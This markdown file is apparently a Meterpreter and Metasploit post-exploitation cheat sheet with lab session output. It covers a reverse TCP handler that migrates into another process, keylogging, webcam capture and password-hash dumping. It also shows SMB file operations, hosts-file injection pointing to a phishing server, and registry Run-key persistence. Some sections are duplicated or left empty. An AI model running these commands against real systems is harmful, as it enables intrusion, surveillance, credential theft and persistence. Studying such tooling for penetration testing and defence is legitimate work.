@@ -1,0 +1,2149 @@
+# Interactive Shell
+
+## 01 - Meta Shell
+
+### 1.1 - Help Menu
+
+```
+Meta shell commands
+===================
+
+    Command     Description
+    -------     -----------
+    help        Help menu
+    background  Backgrounds the current shell session
+    sessions    Quickly switch to another session
+    resource    Run a meta commands script stored in a local file
+    shell       Spawn an interactive shell (*NIX Only)
+    download    Download files (*NIX Only)
+    upload      Upload files (*NIX Only)
+    source      Run a shell script on remote machine (*NIX Only)
+    irb         Open an interactive Ruby shell on the current session
+    pry         Open the Pry debugger on the current session
+```
+
+### 1.2 - Interactive Meta Shell
+
+```
+[*] Command shell session 1 opened (10.0.2.4:34869 -> 192.168.56.106:6200 ) at 2022-03-29 03:43:52 -0400
+
+shell
+[*] Trying to find binary 'python' on the target machine
+[*] Found python at /usr/bin/python
+[*] Using `python` to pop up an interactive shell
+[*] Trying to find binary 'bash' on the target machine
+[*] Found bash at /bin/bash
+root@metasploitable:/# id
+id
+uid=0(root) gid=0(root)
+root@metasploitable:/#
+```
+
+## 02 - Meterpreter
+
+### 2.1 - Basics
+
+#### 2.1.1 - Help Menu
+
+```
+The Basics
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    chmod         Change the permissions of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+```
+
+#### 2.1.2 - Basic Commands
+
+##### 2.1.2.1 - Navigation
+
+* **Change Directory**
+
+`meterpreter > cd <directory>`
+
+`meterpreter > cd Documents`
+
+* **Get current working directory**
+
+```
+meterpreter > pwd
+C:\Users\aiden\
+```
+
+##### 2.1.2.2 - List Contents
+
+```
+meterpreter > ls -h
+Usage: ls [options] [glob/path]
+
+Lists contents of directory or file info, searchable
+
+OPTIONS:
+
+    -h   Help banner
+    -l   List in long format (default)
+    -r   Reverse sort order
+    -R   Recursively list subdirectories encountered
+    -S   Search string on filename (as regular expression)
+    -s   Sort by size
+    -t   Sort by time
+    -x   Show short file names
+
+meterpreter > ls
+Listing: C:\Users\Winpwn10
+==========================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+040777/rwxrwxrwx  4096     dir   2022-05-09 17:53:48 -0400  .dotnet
+040777/rwxrwxrwx  0        dir   2022-05-09 19:33:53 -0400  .nuget
+040777/rwxrwxrwx  0        dir   2022-05-09 16:57:08 -0400  .omnisharp
+040777/rwxrwxrwx  0        dir   2022-05-09 19:11:13 -0400  .templateengine
+040777/rwxrwxrwx  0        dir   2022-05-09 16:49:34 -0400  .vscode
+040777/rwxrwxrwx  0        dir   2022-04-17 21:03:00 -0400  AppData
+040777/rwxrwxrwx  0        dir   2022-04-17 21:03:00 -0400  Application Data
+040555/r-xr-xr-x  0        dir   2022-04-17 21:03:26 -0400  Contacts
+..[snip]..
+
+meterpreter > ls c:\\users\\
+Listing: c:\users\
+==================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2021-06-05 08:26:17 -0400  All Users
+040555/r-xr-xr-x  8192  dir   2022-04-18 03:51:37 -0400  Default
+040777/rwxrwxrwx  0     dir   2021-06-05 08:26:17 -0400  Default User
+040555/r-xr-xr-x  4096  dir   2022-04-17 21:03:26 -0400  Public
+040777/rwxrwxrwx  8192  dir   2022-05-09 19:33:53 -0400  Winpwn10
+100666/rw-rw-rw-  174   fil   2021-06-05 08:08:53 -0400  desktop.ini
+
+meterpreter > ls //ws01/c$
+
+meterpreter > ls \\\\ws01\\c$
+Listing: \\ws01\C$
+====================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+040777/rwxrwxrwx  0      dir   2022-04-18 12:36:20 -0400  $Recycle.Bin
+040777/rwxrwxrwx  0      dir   2022-05-14 17:03:46 -0400  $WinREAgent
+040777/rwxrwxrwx  0      dir   2022-04-18 03:51:37 -0400  Documents and Settings
+000000/---------  0      fif   1969-12-31 19:00:00 -0500  DumpStack.log.tmp
+040777/rwxrwxrwx  0      dir   2021-06-05 08:10:48 -0400  PerfLogs
+040555/r-xr-xr-x  8192   dir   2022-05-09 18:58:12 -0400  Program Files
+040555/r-xr-xr-x  4096   dir   2022-05-09 18:58:12 -0400  Program Files (x86)
+040777/rwxrwxrwx  4096   dir   2022-05-09 18:58:34 -0400  ProgramData
+040777/rwxrwxrwx  0      dir   2022-05-06 19:38:10 -0400  Recovery
+040777/rwxrwxrwx  4096   dir   2022-04-18 03:52:05 -0400  System Volume Information
+040555/r-xr-xr-x  4096   dir   2022-04-17 21:21:15 -0400  Users
+040777/rwxrwxrwx  16384  dir   2022-04-30 20:39:06 -0400  Windows
+000000/---------  0      fif   1969-12-31 19:00:00 -0500  pagefile.sys
+000000/---------  0      fif   1969-12-31 19:00:00 -0500  swapfile.sys
+040777/rwxrwxrwx  0      dir   2022-05-09 16:29:41 -0400  tools
+
+meterpreter > ls -S ".docx" c:/users/%username%/documents/
+```
+
+##### 2.1.2.3 - File Manipulation
+
+* **Copy files**
+
+```
+meterpreter > cp
+Usage: cp oldfile newfile
+```
+
+1. Over SMB Network
+
+```
+meterpreter > cp file.txt //ws01/c$/windows/temp/file.txt
+meterpreter > ls //ws01/c$/windows/temp/file.txt
+100666/rw-rw-rw-  0  fil  2022-05-24 01:52:49 -0400  //defalt/c$/windows/temp/file.txt
+```
+
+* **Move files**
+
+```
+meterpreter > mv
+Usage: mv oldfile newfile
+```
+
+* **Delete files**
+
+```
+meterpreter > rm
+Usage: rm file1 [file2...]
+```
+
+Over SMB Network
+
+`meterpreter > rm //ws01/c$/windows/temp/file.txt`
+
+* **Create directory**
+
+```
+meterpreter > mkdir
+Usage: mkdir dir1 dir2 dir3 ...
+```
+
+* **Delete directories**
+
+```
+meterpreter > rmdir
+Usage: rmdir dir1 dir2 dir3 ...
+```
+
+* **Create/Edit the file**
+
+**Note:** the default editor is `vim` if it's missing it'll switch to `nano` instead
+
+```
+meterpreter > edit
+Edit a file on remote machine.
+Usage: edit file
+```
+
+`meterpreter > edit file.txt`
+
+Over SMB Network
+
+`meterpreter > edit //ws01/c$/Users/%username%/Documents/file.txt`
+
+* **Checksum File hashes**
+
+```
+meterpreter > checksum -h
+Usage: checksum [md5 / sha1] file1 file2 file3 ...
+```
+
+```
+meterpreter > checksum md5 file.txt
+d4142d7def55ea1dfb6875f28cf08d9b  file.txt
+```
+
+##### 2.1.2.4 - Upload and Download Files
+
+```
+meterpreter > upload -h
+Usage: upload [options] src1 src2 src3 ... destination
+
+Uploads local files and directories to the remote machine.
+
+OPTIONS:
+
+    -h  Help banner
+    -r  Upload recursively
+
+meterpreter > download -h
+Usage: download [options] src1 src2 src3 ... destination
+
+Downloads remote files and directories to the local machine.
+
+OPTIONS:
+
+    -a   Enable adaptive download buffer size
+    -b   Set the initial block size for the download
+    -c   Resume getting a partially-downloaded file
+    -h   Help banner
+    -l   Set the limit of retries (0 unlimits)
+    -r   Download recursively
+    -t   Timestamp downloaded files
+```
+
+##### 2.1.2.5 - Load Extension
+
+`meterpreter > load <extension>`
+
+`meterpreter > run <post_module/meterpreter_script>`
+
+##### 2.1.2.6 - Channels
+
+```
+meterpreter > channel -h
+Usage: channel [options]
+
+Displays information about active channels.
+
+OPTIONS:
+
+    -c   Close the given channel.
+    -h   Help menu.
+    -i   Interact with the given channel.
+    -k   Close the given channel.
+    -K   Close all channels.
+    -l   List active channels.
+    -r   Read from the given channel.
+    -w   Write to the given channel.
+
+meterpreter > channel -l
+
+    Id  Class  Type
+    --  -----  ----
+    7   3      stdapi_process
+    8   3      stdapi_process
+    9   3      stdapi_process
+    10  3      stdapi_process
+    11  3      stdapi_process
+    12  3      stdapi_process
+    13  3      stdapi_process
+    14  3      stdapi_process
+    16  3      stdapi_process
+    17  3      stdapi_process
+    18  3      stdapi_process
+    19  3      stdapi_process
+
+meterpreter > channel -K
+Killing all channels...
+Killed all channels.
+```
+
+##### 2.1.2.7 - Background
+
+```
+meterpreter > channel -h
+Usage: channel [options]
+
+Displays information about active channels.
+
+OPTIONS:
+
+    -c   Close the given channel.
+    -h   Help menu.
+    -i   Interact with the given channel.
+    -k   Close the given channel.
+    -K   Close all channels.
+    -l   List active channels.
+    -r   Read from the given channel.
+    -w   Write to the given channel.
+
+meterpreter > channel -l
+
+    Id  Class  Type
+    --  -----  ----
+    7   3      stdapi_process
+    8   3      stdapi_process
+    9   3      stdapi_process
+    10  3      stdapi_process
+    11  3      stdapi_process
+    12  3      stdapi_process
+    13  3      stdapi_process
+    14  3      stdapi_process
+    16  3      stdapi_process
+    17  3      stdapi_process
+    18  3      stdapi_process
+    19  3      stdapi_process
+
+meterpreter > channel -K
+Killing all channels...
+Killed all channels.
+```
+
+##### 2.1.2.8 - Background
+
+```
+meterpreter > background
+[*] Backgrounding session 1...
+```
+
+##### 2.1.2.9 - Re-encrypt key
+
+* **(Re)negotiate TLV packets for encryption**
+
+```
+meterpreter > secure
+[*] Negotiating new encryption key ...
+[+] Done.
+```
+
+##### 2.1.2.10 - Spawn Interactive Shell
+
+* **Windows**
+
+`meterpreter > shell`
+
+* **Linux**
+
+`meterpreter > shell -t`
+
+#### 2.1.3 - Internal Reconnaissance
+
+##### 2.1.3.1 - System
+
+* **Show hardware information of the host**
+
+```
+meterpreter > sysinfo
+Computer        : DEFALT
+OS              : Windows 10 (10.0 Build 22000).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+```
+
+* **Retrieve UUID**
+
+`meterpreter > uuid`
+
+* **Get current session ID**
+
+`meterpreter > machine_id`
+
+* **Discover Username**
+ 
+```
+meterpreter > getuid
+Server username: Defalt\Winpwn10
+```
+
+* **Discover SID**
+
+```
+meterpreter > getsid
+Server SID: S-1-5-21-2079428845-521281716-553417191-1001
+```
+
+* **Retrieve Privileges**
+
+`meterpreter > getprivs`
+
+```
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+```
+
+`meterpreter > show_mount`
+
+```
+Mounts / Drives
+===============
+
+Name  Type   Size (Total)  Size (Free)  Mapped to
+----  ----   ------------  -----------  ---------
+C:\   fixed  79.29 GiB     38.84 GiB
+D:\   cdrom  0.00 B        0.00 B
+
+
+Total mounts/drives: 2
+```
+
+```
+meterpreter > idletime
+User has been idle for: 3 mins 38 secs
+```
+
+```
+meterpreter > localtime
+Local Date/Time: 2022-05-14 14:39:41.311 Pacific Daylight Time (UTC-800)
+```
+
+##### 2.1.3.2 - Processes
+
+* **List Processes**
+
+```
+meterpreter > ps -h
+Usage: ps [ options ] pattern
+
+Use the command with no arguments to see all running processes.
+The following options can be used to filter those results:
+
+OPTIONS:
+
+    -A   Filter on architecture
+    -c   Filter only child processes of the current shell
+    -h   Help menu.
+    -S   Filter on process name
+    -s   Filter only SYSTEM processes
+    -U   Filter on user name
+    -x   Filter for exact matches rather than regex
+
+meterpreter > ps -S svchost.exe
+Filtering on 'svchost.exe'
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User             Path
+ ---   ----  ----         ----  -------  ----             ----
+ 536   672   svchost.exe
+ 632   672   svchost.exe
+ 788   672   svchost.exe
+ 924   672   svchost.exe
+ 976   672   svchost.exe
+ 980   672   svchost.exe
+ 1068  672   svchost.exe
+ 1084  672   svchost.exe
+ 1096  672   svchost.exe
+ 1136  672   svchost.exe
+ 1160  672   svchost.exe
+ 1196  672   svchost.exe
+ 1364  672   svchost.exe  x64   1        Defalt\Winpwn10  C:\Windows\System32\svchost.exe
+ ..[snip]..
+
+meterpreter > ps -s
+Filtering on SYSTEM processes...
+
+Process List
+============
+
+ PID   PPID  Name                Arch  Session  User                 Path
+ ---   ----  ----                ----  -------  ----                 ----
+ 536   672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
+ 632   672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
+ 636   536   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
+ 696   544   lsass.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe
+ 788   672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
+ 980   672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
+ 1096  672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
+ 1196  672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
+..[snip]..
+
+meterpreter > ps -U Winpwn10
+Filtering on user 'Winpwn10'
+
+Process List
+============
+
+ PID   PPID  Name                       Arch  Session  User             Path
+ ---   ----  ----                       ----  -------  ----             ----
+ 208   788   MiniSearchHost.exe         x64   1        Defalt\Winpwn10  C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\MiniSearchHost.exe
+ 288   4268  OneDrive.exe               x64   1        Defalt\Winpwn10  C:\Users\Winpwn10\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+ 784   2164  msedgewebview2.exe         x64   1        Defalt\Winpwn10  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\101.0.1210.39\msedgewebview2.exe
+ 1364  672   svchost.exe                x64   1        Defalt\Winpwn10  C:\Windows\System32\svchost.exe
+ 1472  788   ApplicationFrameHost.exe   x64   1        Defalt\Winpwn10  C:\Windows\System32\ApplicationFrameHost.exe
+ 2060  788   SystemSettings.exe         x64   1        Defalt\Winpwn10  C:\Windows\ImmersiveControlPanel\SystemSettings.exe
+ 2164  5748  msedgewebview2.exe         x64   1        Defalt\Winpwn10  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\101.0.1210.39\msedgewebview2.exe
+..[snip]..
+```
+
+* **Filter Processes**
+
+1. Filter to retrieve process ID
+
+```
+meterpreter > pgrep -h
+Usage: pgrep [ options ] pattern
+Filter processes by name.
+
+OPTIONS:
+
+    -A   Filter on architecture
+    -c   Filter only child processes of the current shell
+    -f   Display process path and args with PID (combine with -l)
+    -h   Help menu.
+    -l   Display process name with PID
+    -S   Filter on process name
+    -s   Filter only SYSTEM processes
+    -U   Filter on user name
+    -x   Filter for exact matches rather than regex
+
+meterpreter > pgrep <process_name>
+
+meterpreter > pgrep lsass
+696
+```
+
+##### 2.1.3.3 - Networking
+
+* **Help Menu**
+
+```
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+```
+
+* **IP Address**
+
+```
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 12
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter
+Hardware MAC : 08:00:27:3c:90:25
+MTU          : 1500
+IPv4 Address : 10.0.2.15
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::60ca:62c2:b4fd:807a
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+```
+
+* **Netstat**
+
+```
+meterpreter > netstat
+
+Connection list
+===============
+
+    Proto  Local address                    Remote address      State        User  Inode  PID/Program name
+    -----  -------------                    --------------      -----        ----  -----  ----------------
+    tcp    0.0.0.0:135                      0.0.0.0:*           LISTEN       0     0      924/svchost.exe
+    tcp    0.0.0.0:445                      0.0.0.0:*           LISTEN       0     0      4/System
+    tcp    0.0.0.0:5040                     0.0.0.0:*           LISTEN       0     0      5112/svchost.exe
+    tcp    0.0.0.0:7680                     0.0.0.0:*           LISTEN       0     0      7780/svchost.exe
+    tcp    0.0.0.0:49664                    0.0.0.0:*           LISTEN       0     0      696/lsass.exe
+    tcp    0.0.0.0:49665                    0.0.0.0:*           LISTEN       0     0      544/wininit.exe
+    tcp    0.0.0.0:49666                    0.0.0.0:*           LISTEN       0     0      632/svchost.exe
+    tcp    0.0.0.0:49667                    0.0.0.0:*           LISTEN       0     0      1540/svchost.exe
+    tcp    0.0.0.0:49668                    0.0.0.0:*           LISTEN       0     0      2120/spoolsv.exe
+    tcp    0.0.0.0:49669                    0.0.0.0:*           LISTEN       0     0      672/services.exe
+    tcp    10.0.2.15:139                    0.0.0.0:*           LISTEN       0     0      4/System
+    tcp    10.0.2.15:49928                  20.198.162.78:443   ESTABLISHED  0     0      2548/svchost.exe
+    tcp    10.0.2.15:49980                  10.0.2.4:445        ESTABLISHED  0     0      7268/powershell.exe
+    tcp    10.0.2.15:49999                  52.179.216.235:443  TIME_WAIT    0     0      0/[System Process]
+    tcp6   :::135                           :::*                LISTEN       0     0      924/svchost.exe
+    tcp6   :::445                           :::*                LISTEN       0     0      4/System
+    tcp6   :::7680                          :::*                LISTEN       0     0      7780/svchost.exe
+    tcp6   :::49664                         :::*                LISTEN       0     0      696/lsass.exe
+    tcp6   :::49665                         :::*                LISTEN       0     0      544/wininit.exe
+    tcp6   :::49666                         :::*                LISTEN       0     0      632/svchost.exe
+    tcp6   :::49667                         :::*                LISTEN       0     0      1540/svchost.exe
+    tcp6   :::49668                         :::*                LISTEN       0     0      2120/spoolsv.exe
+    tcp6   :::49669                         :::*                LISTEN       0     0      672/services.exe
+    udp    0.0.0.0:123                      0.0.0.0:*                        0     0      7200/svchost.exe
+    udp    0.0.0.0:5050                     0.0.0.0:*                        0     0      5112/svchost.exe
+    udp    0.0.0.0:5353                     0.0.0.0:*                        0     0      1436/svchost.exe
+    udp    0.0.0.0:5355                     0.0.0.0:*                        0     0      1436/svchost.exe
+    udp    0.0.0.0:56498                    0.0.0.0:*                        0     0      1436/svchost.exe
+    udp    0.0.0.0:58224                    0.0.0.0:*                        0     0      1436/svchost.exe
+    udp    10.0.2.15:137                    0.0.0.0:*                        0     0      4/System
+    udp    10.0.2.15:138                    0.0.0.0:*                        0     0      4/System
+    udp    10.0.2.15:1900                   0.0.0.0:*                        0     0      7044/svchost.exe
+    udp    10.0.2.15:63859                  0.0.0.0:*                        0     0      7044/svchost.exe
+    udp    127.0.0.1:1900                   0.0.0.0:*                        0     0      7044/svchost.exe
+    udp    127.0.0.1:59238                  0.0.0.0:*                        0     0      2428/svchost.exe
+    udp    127.0.0.1:63860                  0.0.0.0:*                        0     0      7044/svchost.exe
+    udp6   :::123                           :::*                             0     0      7200/svchost.exe
+    udp6   :::5353                          :::*                             0     0      1436/svchost.exe
+    udp6   :::5355                          :::*                             0     0      1436/svchost.exe
+    udp6   :::56498                         :::*                             0     0      1436/svchost.exe
+    udp6   :::58224                         :::*                             0     0      1436/svchost.exe
+    udp6   ::1:1900                         :::*                             0     0      7044/svchost.exe
+    udp6   ::1:63858                        :::*                             0     0      7044/svchost.exe
+    udp6   fe80::60ca:62c2:b4fd:807a:1900   :::*                             0     0      7044/svchost.exe
+    udp6   fe80::60ca:62c2:b4fd:807a:63857  :::*                             0     0      7044/svchost.exe
+```
+
+* **ARP**
+
+```
+meterpreter > arp
+
+ARP cache
+=========
+
+    IP address       MAC address        Interface
+    ----------       -----------        ---------
+    10.0.2.1         52:54:00:12:35:00  12
+    10.0.2.3         08:00:27:32:5d:a1  12
+    10.0.2.4         08:00:27:8f:39:74  12
+    10.0.2.255       ff:ff:ff:ff:ff:ff  12
+    224.0.0.22       00:00:00:00:00:00  1
+    224.0.0.22       01:00:5e:00:00:16  12
+    224.0.0.251      01:00:5e:00:00:fb  12
+    224.0.0.252      01:00:5e:00:00:fc  12
+    239.255.255.250  00:00:00:00:00:00  1
+    239.255.255.250  01:00:5e:7f:ff:fa  12
+    255.255.255.255  ff:ff:ff:ff:ff:ff  12
+```
+
+* **Route**
+
+```
+meterpreter > route -h
+Usage: route [-h] command [args]
+
+Display or modify the routing table on the remote machine.
+
+Supported commands:
+
+   add    [subnet] [netmask] [gateway]
+   delete [subnet] [netmask] [gateway]
+   list
+
+
+
+OPTIONS:
+
+    -h  Help banner.
+
+meterpreter > route
+
+IPv4 network routes
+===================
+
+    Subnet           Netmask          Gateway    Metric  Interface
+    ------           -------          -------    ------  ---------
+    0.0.0.0          0.0.0.0          10.0.2.1   25      12
+    10.0.2.0         255.255.255.0    10.0.2.15  281     12
+    10.0.2.15        255.255.255.255  10.0.2.15  281     12
+    10.0.2.255       255.255.255.255  10.0.2.15  281     12
+    127.0.0.0        255.0.0.0        127.0.0.1  331     1
+    127.0.0.1        255.255.255.255  127.0.0.1  331     1
+    127.255.255.255  255.255.255.255  127.0.0.1  331     1
+    224.0.0.0        240.0.0.0        127.0.0.1  331     1
+    224.0.0.0        240.0.0.0        10.0.2.15  281     12
+    255.255.255.255  255.255.255.255  127.0.0.1  331     1
+    255.255.255.255  255.255.255.255  10.0.2.15  281     12
+
+No IPv6 routes were found.
+```
+
+* **Proxy**
+
+```
+meterpreter > getproxy
+Auto-detect     : Yes
+Auto config URL :
+Proxy URL       :
+Proxy Bypass    :
+```
+
+* **Resolve DNS**
+
+```
+meterpreter > resolve -h
+Usage: resolve host1 host2 .. hostN [-h] [-f IPv4|IPv6]
+
+
+OPTIONS:
+
+    -f   Address family - IPv4 or IPv6 (default IPv4)
+    -h   Help banner.
+
+meterpreter > resolve 10.0.2.3
+
+Host resolutions
+================
+
+    Hostname  IP Address
+    --------  ----------
+    10.0.2.3  10.0.2.3
+```
+
+* **Inject DNS Hosts**
+
+```
+msf > use post/windows/manage/inject_host
+
+msf post(windows/manage/inject_host) > options
+
+Module options (post/windows/manage/inject_host):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   DOMAIN                    yes       Domain name for host file manipulation.
+   IP                        yes       IP address to point domain name to.
+   SESSION                   yes       The session to run this module on
+
+msf post(windows/manage/inject_host) > set domain <domain_name>
+
+msf post(windows/manage/inject_host) > set ip <phishing_server>
+
+msf post(windows/manage/inject_host) > set session <session_id>
+
+msf post(windows/manage/inject_host) > run
+```
+
+##### 2.1.3.4 - Registry
+
+* **Help Menu**
+
+```
+meterpreter > reg -h
+Usage: reg [command] [options]
+Interact with the target machine's registry.
+
+OPTIONS:
+
+    -d   The data to store in the registry value.
+    -h   Help menu.
+    -k   The registry key path (E.g. HKLM\Software\Foo).
+    -r   The remote machine name to connect to (with current process credentials
+    -t   The registry value type (E.g. REG_SZ).
+    -v   The registry value name (E.g. Stuff).
+    -w   Set KEY_WOW64 flag, valid values [32|64].
+COMMANDS:
+
+    enumkey     Enumerate the supplied registry key [-k <key>]
+    createkey   Create the supplied registry key  [-k <key>]
+    deletekey   Delete the supplied registry key  [-k <key>]
+    queryclass  Queries the class of the supplied key [-k <key>]
+    setval      Set a registry value [-k <key> -v <val> -d <data>]
+    deleteval   Delete the supplied registry value [-k <key> -v <val>]
+    queryval    Queries the data contents of a value [-k <key> -v <val>]
+```
+
+* **Basic Commands**
+
+```
+meterpreter > reg enumkey -k hklm\\software\\microsoft\\currentversion\\run
+
+meterpreter > reg setval -k hklm\\software\\microsoft\\windows\\currentversion\\run -v <value> -t REG_SZ -d 'C:\path\to\shell.exe'
+
+meterpreter > reg queryval -k hklm\\software\\microsoft\\currentversion\\run -v <value>
+
+meterpreter > reg
+
+meterpreter > reg
+
+meterpreter > reg
+
+meterpreter > reg
+```
+
+#### 2.1.4 - Process Manipulation
+
+##### 2.1.4.1 - Migrate to Another Process
+
+* **Setting up listener to auto migrate to another process**
+
+```
+msf exploit(multi/handler) > set lhost 10.0.2.4
+
+msf exploit(multi/handler) > set lport 4444
+
+msf exploit(multi/handler) > set autorunscript post/windows/manage/migrate name=notepad.exe
+
+msf exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.0.2.4:4444 
+[*] Sending stage (200262 bytes) to 10.0.2.15
+[*] Session ID 4 (10.0.2.4:4444 -> 10.0.2.15:49840 ) processing AutoRunScript 'post/windows/manage/migrate name=notepad.exe'
+[*] Running module against DEFALT
+[*] Current server process: powershell.exe (1136)
+[*] Spawning notepad.exe process to migrate into
+[*] Spoofing PPID 0
+[*] Migrating into 1280
+[+] Successfully migrated into process 1280
+[*] Meterpreter session 4 opened (10.0.2.4:4444 -> 10.0.2.15:49840 ) at 2022-05-15 15:35:51 -0400
+```
+
+* **Migrate to another process**
+
+```
+meterpreter > migrate -h
+Usage: migrate <<pid> | -P <pid> | -N <name>> [-t timeout]
+
+Migrates the server instance to another process.
+NOTE: Any open channels or other dynamic state will be lost.
+
+meterpreter > migrate <pid>
+
+meterpreter > migrate -N <process_name>
+
+meterpreter > migrate -N winlogon.exe
+[*] Migrating from 4980 to 412...
+[*] Migration completed successfully.
+```
+
+##### 2.1.4.2 - Get Process ID
+
+```
+meterpreter > getpid
+Current pid: 1280
+```
+
